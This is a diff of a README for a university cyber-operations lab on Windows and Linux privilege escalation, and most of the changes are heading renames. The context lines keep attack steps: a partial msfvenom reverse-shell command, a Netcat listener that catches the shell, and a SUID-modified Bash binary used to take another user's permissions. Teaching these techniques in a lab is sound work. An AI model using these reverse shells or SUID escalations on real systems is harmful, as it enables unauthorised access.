@@ -7,7 +7,7 @@ Created for DSU's Cyber Operations I course
 | Windows Exercises | Windows 10 Pro build 19044 |
 * Windows Defender is disabled via Group Policy on the Windows Exercises box.
 
-## Windows PrivEsc (Horizontal/Vertical)
+## Lab Exercise 1: Widnows Horizontal/Vertical PrivEsc
 ### Configuration
 #### Horizontal PrivEsc via Unquoted Service Path
 1. Add two additional standard users the box, with different passwords. Use the only one of the users for the following steps.
@@ -48,9 +48,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> 
 3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
 4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the first user. Use `whoami` to verify this.
 
-## Linux Horziontal PrivEsc
+## Lab Exercise 2: Linux Horziontal PrivEsc via SUID
 ### Configuration
-#### Horizontal PrivEsc via SUID
 1. Add two additional users the box, with different passwords. These users should not be able to use `sudo`. Use the only one of the users for the following steps.
 2. Create a "Step 4" folder on the desktop of the first user.
 3. Build the modified Bash shell in the Linux PrivEsc folder in the repo with `./configure` and `make`. Name it `shell`.
@@ -68,8 +67,9 @@ chmod u-x /usr/bin
 ```
 
 ### Exploitation
-#### Horizontal PrivEsc via SUID
 1. Log on to the second user created in Configuration step 1.
 2. Execute the `/usr/bin/shell` file. A Bash shell should spawn with the permissions of the first user. Use `whoami` to verify this.
 
-## Linux Vertical PrivEsc
+## Lab Exercise 3: Linux Vertical PrivEsc
+
+## Puzzler: Correcting PrivEsc Vulnerabilities
